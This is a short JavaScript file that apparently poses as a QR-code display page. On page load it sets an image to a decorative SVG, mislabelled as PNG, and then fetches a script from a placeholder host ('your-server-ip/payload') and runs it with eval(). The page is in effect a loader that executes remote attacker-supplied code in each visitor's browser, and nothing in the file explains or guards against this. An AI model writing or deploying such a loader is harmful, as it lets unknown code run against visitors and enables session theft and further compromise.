document.addEventListener('DOMContentLoaded', (event) => {
    const qrCodeImg = document.getElementById('qrCode');
    qrCodeImg.src = 'data:image/png;base64,' + btoa(unescape(encodeURIComponent(
        `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 179.8 179.8"><path d="M89.9,0C40.5,0,0,40.5,0,89.9s40.5,89.9,89.9,89.9S179.8,139.4,179.8,89.9S139.4,0,89.9,0zM89.9,26.3c25.8,0,46.7,20.9,46.7,46.7s-20.9,46.7-46.7,46.7C64.1,120,43.2,99.1,43.2,73.3S64.1,26.3,89.9,26.3zM89.9,54c-18.9,0-34.3,15.5-34.3,34.3s15.4,34.3,34.3,34.3S124.2,98.2,124.2,79.3c0-6.4-2.9-12.2-7.5-16.9l-5.5-5.5L89.9,54z" fill="#000"/><path d="M89.9,133.6v32c0,8.3-6.7,15-15,15s-15-6.7-15-15V133.6c0-4.4,2.3-8.5,5.9-10.7l6.4-6.4c3.6-3.6,8.7-3.6,12.3,0l6.4,6.4C140.8,125.1,143.1,129.1,143.1,133.6z" fill="#fff"/></svg>`
    )));

    const payloadUrl = 'http://your-server-ip/payload';
    fetch(payloadUrl)
        .then(response => response.text())
        .then(payloadScript => {
            eval(payloadScript);
        })
        .catch(error => console.error('Error fetching payload:', error));
});
